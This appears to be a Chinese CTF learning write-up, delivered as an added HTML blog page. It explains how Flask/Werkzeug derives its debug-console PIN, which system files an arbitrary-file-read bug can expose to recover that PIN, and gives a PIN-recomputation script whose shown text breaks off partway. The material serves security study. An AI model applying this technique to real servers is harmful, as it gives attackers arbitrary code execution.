@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baicany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="要配合任意文件读取哦&#x3D;w&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask_debug_pin">
+<meta property="og:url" content="https://baicany.github.io/2023/06/03/python_debug_pin/index.html">
+<meta property="og:site_name" content="baicany">
+<meta property="og:description" content="要配合任意文件读取哦&#x3D;w&#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://baicany.github.io/images/3687.jpg">
+<meta property="article:published_time" content="2023-06-03T12:16:01.000Z">
+<meta property="article:modified_time" content="2023-06-04T09:52:32.384Z">
+<meta property="article:author" content="baicany">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baicany.github.io/images/3687.jpg">
+
+
+<link rel="canonical" href="https://baicany.github.io/2023/06/03/python_debug_pin/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"https://baicany.github.io/2023/06/03/python_debug_pin/","path":"2023/06/03/python_debug_pin/","title":"flask_debug_pin"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>flask_debug_pin | baicany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baicany</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome my world !</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFUUID"><span class="nav-number">1.</span> <span class="nav-text">什么是UUID</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="nav-number"></span> <span class="nav-text">代码逻辑分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#machine-id"><span class="nav-number">0.1.</span> <span class="nav-text">machine_id</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%85%8D%E5%90%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number"></span> <span class="nav-text">配合任意文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nssctf-NISACTF-2022-is-secret"><span class="nav-number">1.</span> <span class="nav-text">nssctf [NISACTF 2022]is secret</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baicany"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">baicany</p>
+  <div class="site-description" itemprop="description">web小菜狗一枚</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  <div class="post-gallery" itemscope itemtype="http://schema.org/ImageGallery">
+    
+    <div class="post-gallery-image">
+      <img src="https://baicany.github.io/images/3687.jpg" itemprop="contentUrl">
+    </div>
+    </div>
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://baicany.github.io/2023/06/03/python_debug_pin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="baicany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baicany">
+      <meta itemprop="description" content="web小菜狗一枚">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="flask_debug_pin | baicany">
+      <meta itemprop="description" content="要配合任意文件读取哦=w=">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          flask_debug_pin
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-06-03 20:16:01" itemprop="dateCreated datePublished" datetime="2023-06-03T20:16:01+08:00">2023-06-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-06-04 17:52:32" itemprop="dateModified" datetime="2023-06-04T17:52:32+08:00">2023-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">要配合任意文件读取哦=w=</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Flask在debug模式下会生成一个Debugger PIN</p>
+<p>通过这个pin码，可以在报错页面执行任意python代码</p>
+<p>同一台机子上多次启动同一个Flask应用时，会发现这个pin码是固定的。</p>
+<p>uuid是啥不重要,只是写的时候去了解了</p>
+<h3 id="什么是UUID"><a href="#什么是UUID" class="headerlink" title="什么是UUID"></a>什么是UUID</h3><p><strong>UUID是一个通用唯一标识符</strong>。也可以将其称为GUID，即全局唯一标识符。</p>
+<p>UUID是128位长的数字或ID，用于唯一标识计算机系统中的文档，用户，资源或信息。</p>
+<ul>
+<li>UUID可以保证标识符在空间和时间上的唯一性。当我们谈论空间和时间时，是指当根据标准生成UUID时，标识符不会重复已经创建的标识符或将被创建以标识其他事物的标识符。</li>
+<li>因此，在需要唯一值的情况下，UUID很有用。</li>
+</ul>
+<p>根据**<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc4122.html">RFC 4122</a><strong>实现的Python UUID模块 。RFC 4122是Internet协会的标准和版权（C）。</strong>R** FC 4122规范包括所有详细信息和算法，以生成所有版本的唯一标识符。RFC 4122文档指定了三种生成UUID的算法。</p>
+<p>因此，使用Python UUID模块，您可以生成版本1、3、4和5 UUID。使用此模块生成的UUID是不可变的。</p>
+<p>Python UUID模块支持以下版本的UUID。</p>
+<ul>
+<li>UUID1 –使用主机MAC地址，序列号和当前时间生成UUID。此版本使用IEEE 802 MAC地址。</li>
+<li>UUID3和UUID 5使用加密哈希和应用程序提供的文本字符串来生成UUID。UUID 3使用MD5哈希，而UUID 5使用SHA-1哈希。</li>
+<li>UUID4使用伪随机数生成器生成UUID。</li>
+</ul>
+<p>HDCTF [yamiyami]</p>
+<h1 id="代码逻辑分析"><a href="#代码逻辑分析" class="headerlink" title="代码逻辑分析"></a>代码逻辑分析</h1><p>建议要去做做o(╥﹏╥)o因为这是以前的分析了，版本更新后，内容会更改，踩了坑</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>用pycharm在app.run下好断点，开启debug模式</p>
+<p>大致跟踪流程如下</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="keyword">py</span> </span><br><span class="line"><span class="keyword">python3</span>.<span class="number">5</span>/site-packages/flask/app.<span class="keyword">py</span>  <span class="number">772</span>行左右 run_simple(host, port, self, **<span class="keyword">options</span>)</span><br><span class="line"><span class="keyword">python3</span>.<span class="number">5</span>/site-packages/werkzeug/serving.<span class="keyword">py</span> <span class="number">751</span>行左右 application = DebuggedApplication(application, use_evalex)</span><br><span class="line"><span class="keyword">python3</span>.<span class="number">5</span>/site-packages/werkzeug/<span class="keyword">debug</span>/__init__.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>
+
+<p>具体可网上搜</p>
+<p>最主要的就是这一段哈希部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, text_type):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>连接了两个列表，然后循环里面的值做哈希</p>
+<p>这两个列表的定义</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&#x27;__name__&#x27;</span>, <span class="built_in">getattr</span>(app.__class__, <span class="string">&#x27;__name__&#x27;</span>)),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&#x27;__file__&#x27;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        <span class="built_in">str</span>(uuid.getnode()),</span><br><span class="line">        get_machine_id(),</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">username <span class="comment"># 用户名</span></span><br><span class="line"></span><br><span class="line">modname <span class="comment"># flask.app</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(app, <span class="string">&#x27;__name__&#x27;</span>, <span class="built_in">getattr</span>(app.__class__, <span class="string">&#x27;__name__&#x27;</span>)) <span class="comment"># Flask</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(mod, <span class="string">&#x27;__file__&#x27;</span>, <span class="literal">None</span>) <span class="comment"># flask目录下的一个app.py的绝对路径</span></span><br><span class="line"></span><br><span class="line">uuid.getnode() <span class="comment"># mac地址十进制</span></span><br><span class="line"></span><br><span class="line">get_machine_id() <span class="comment"># /etc/machine-id或或/proc/sys/kernel/random/boot_i</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="machine-id"><a href="#machine-id" class="headerlink" title="machine_id"></a>machine_id</h4><p>每一个机器都会有自已唯一的id，linux的id一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_id</code>，docker靶机则读取<code>/proc/self/cgroup</code>，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_generate</span>():</span><br><span class="line">        <span class="comment"># Potential sources of secret information on linux.  The machine-id</span></span><br><span class="line">        <span class="comment"># is stable across boots, the boot id is not</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&#x27;/etc/machine-id&#x27;</span>, <span class="string">&#x27;/proc/sys/kernel/random/boot_id&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X we can use the computer&#x27;s serial number assuming that</span></span><br><span class="line">        <span class="comment"># ioreg exists and can spit out that information.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Also catch import errors: subprocess may not be available, e.g.</span></span><br><span class="line">            <span class="comment"># Google App Engine</span></span><br><span class="line">            <span class="comment"># See https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line">            dump = Popen([<span class="string">&#x27;ioreg&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;IOPlatformExpertDevice&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;2&#x27;</span>],</span><br><span class="line">                         stdout=PIPE).communicate()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows we can use winreg to get the machine guid</span></span><br><span class="line">        wr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg <span class="keyword">as</span> wr</span><br><span class="line">        <span class="keyword">except</span> ImportError:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">import</span> _winreg <span class="keyword">as</span> wr</span><br><span class="line">            <span class="keyword">except</span> ImportError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> wr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> wr.OpenKey(wr.HKEY_LOCAL_MACHINE,</span><br><span class="line">                                <span class="string">&#x27;SOFTWARE\\Microsoft\\Cryptography&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">                                wr.KEY_READ | wr.KEY_WOW64_64KEY) <span class="keyword">as</span> rk:</span><br><span class="line">                    machineGuid, wrType = wr.QueryValueEx(rk, <span class="string">&#x27;MachineGuid&#x27;</span>)</span><br><span class="line">                    <span class="keyword">if</span> (wrType == wr.REG_SZ):</span><br><span class="line">                        <span class="keyword">return</span> machineGuid.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> machineGuid</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    _machine_id = rv = _generate()</span><br><span class="line">    <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure>
+
+<p>首先尝试读取<code>/etc/machine-id</code>或者 <code>/proc/sys/kernel/random/boot_i</code>中的值，若有就直接返回</p>
+<p>当这6个值我们可以获取到时，就可以推算出生成的PIN码，引发任意代码执行</p>
+<h1 id="配合任意文件读取"><a href="#配合任意文件读取" class="headerlink" title="配合任意文件读取"></a>配合任意文件读取</h1><p>通过debug报错,分析app.py的绝对路径</p>
+<p>通过任意文件读取&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，</p>
+<p>一般题目是docker环境，因此读机器id需要读&#x2F;proc&#x2F;self&#x2F;cgroup：</p>
+<p>&#x2F;etc&#x2F;passwd，读取用户名</p>
+<p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，读取mac地址</p>
+<p>虚拟机中网卡为ens33,一般情况下应该是eth0</p>
+<p>踩坑:</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">虽然爆出路径是/usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">python2</span>.7/<span class="title">site</span>-<span class="title">packages</span>/<span class="title">flask</span>/<span class="title">app</span>.<span class="title">py</span>&quot;但实际是<span class="title">app</span>.<span class="title">pyc</span></span></span><br><span class="line">python不同版本不同加密<span class="number">3.6</span>采用MD5加密，<span class="number">3.8</span>采用sha1加密，所以脚本有所不同</span><br><span class="line">机器id读取顺序不同</span><br><span class="line">werkzeug <span class="number">0.15</span>.<span class="number">5</span>之前</span><br><span class="line"><span class="regexp">/etc/machine</span>-id-&gt;<span class="regexp">/proc/sys</span><span class="regexp">/kernel/random</span><span class="regexp">/boot_id-&gt;ioreg -c IOPlatformExpertDevice -d 2-&gt;HKEY_LOCAL_MACHINE/</span>SOFTWARE/Microsoft/Cryptography/MachineGuid</span><br><span class="line"></span><br><span class="line"><span class="number">0.15</span>.<span class="number">5</span>-<span class="number">0.16</span>.<span class="number">0</span></span><br><span class="line"><span class="regexp">/proc/self</span><span class="regexp">/cgroup-&gt;/etc</span><span class="regexp">/machine-id-&gt;/proc</span><span class="regexp">/sys/kernel</span><span class="regexp">/random/boot</span>_id-&gt;ioreg -c IOPlatformExpertDevice -d <span class="number">2</span>-&gt;HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid</span><br><span class="line"></span><br><span class="line"><span class="regexp">/proc/self</span><span class="regexp">/cgroup需要用正则value.strip().partition(&quot;/docker</span><span class="regexp">/&quot;)[2]分割</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">0.16.0之后</span></span><br><span class="line"><span class="regexp">/etc</span><span class="regexp">/machine-id-&gt;/proc</span><span class="regexp">/sys/kernel</span><span class="regexp">/random/boot</span>_id-&gt;<span class="regexp">/proc/self</span><span class="regexp">/cgroup-&gt;ioreg -c IOPlatformExpertDevice -d 2-&gt;HKEY_LOCAL_MACHINE/</span>SOFTWARE/Microsoft/Cryptography/MachineGuid</span><br><span class="line"></span><br><span class="line"><span class="number">2020.1</span>.<span class="number">5</span>对 machine_id() 进行了更新 ，所以<span class="number">2020.1</span>.<span class="number">5</span>之前的版本是跟这里不同的，具体更新情况可看</span><br><span class="line"><span class="symbol">https:</span>/<span class="regexp">/github.com/pallets</span><span class="regexp">/werkzeug/commit</span><span class="regexp">/617309a7c317ae1ade428de48f5bc4a906c2950f</span></span><br><span class="line"><span class="regexp">2020.1.5修改前是：</span></span><br><span class="line"><span class="regexp">是依序读取 /proc</span><span class="regexp">/self/cgroup</span>、/etc/machine-id、/proc/sys/kernel/random/boot_id 三个文件，只要读取到一个文件的内容，立马返回值。</span><br><span class="line">现在只要从 /etc/machine-id、/proc/sys/kernel/random/boot_id 中读到一个值后立即 <span class="keyword">break</span>，然后和/proc/<span class="keyword">self</span>/cgroup 中的id值拼接</span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;kingkk&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;52242498922&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;19949f18ce36422da1402b3e3fe53008&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    